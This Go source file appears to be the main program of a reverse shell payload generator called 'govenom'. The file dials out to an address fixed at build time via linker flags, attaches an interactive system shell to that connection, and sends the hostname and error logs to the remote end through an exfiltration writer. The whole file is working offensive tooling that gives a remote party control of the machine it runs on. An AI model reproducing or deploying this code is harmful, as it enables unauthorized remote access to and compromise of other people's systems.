package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"

	"govenom/exfilwriter"
)

var (
	// set during compilation/linking via -X ldflag
	address      string
	network      string
	exfilCfg     string
	noWindowsGui string
	shell        string
)

func determineShellBinary(candidates []string) (string, error) {
	candidates = append([]string{shell}, candidates...)
	for _, candidate := range candidates {
		binary, err := exec.LookPath(candidate)
		if err != nil {
			continue
		}
		return binary, nil
	}
	return "", fmt.Errorf("could not find any existing shell binary")
}

func attachShell(binaryPath string, con net.Conn) error {
	var cmd *exec.Cmd
	cmd = exec.Command(binaryPath, "-i")
	cmd.SysProcAttr = getSysProcAttr()
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con

	err := cmd.Start()
	if err != nil {
		return fmt.Errorf("could not start shell: %v", err)
	}
	err = cmd.Wait()
	if err != nil {
		return fmt.Errorf("shell died: %v", err)
	}
	return nil
}

func main() {
	w, errs := exfilwriter.New(exfilCfg)
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	log := log.New(w, fmt.Sprintf("%s: ", hostname), 0)

	conn, err := net.Dial(network, address)
	if err != nil {
		log.Fatal(err)
	}
	w.AddExfiltrator(conn)
	// send out debuglog configuration errors *at least* over TCP
	if len(errs) > 0 {
		for _, err := range errs {
			log.Println(err)
		}
	}

	binaryPath, err := determineShellBinary(getShellBinaries())
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("Using Shell: %s\n", binaryPath)

	err = attachShell(binaryPath, conn)
	if err != nil {
		log.Fatal(err)
	}
	log.Println("Shell terminated")
}
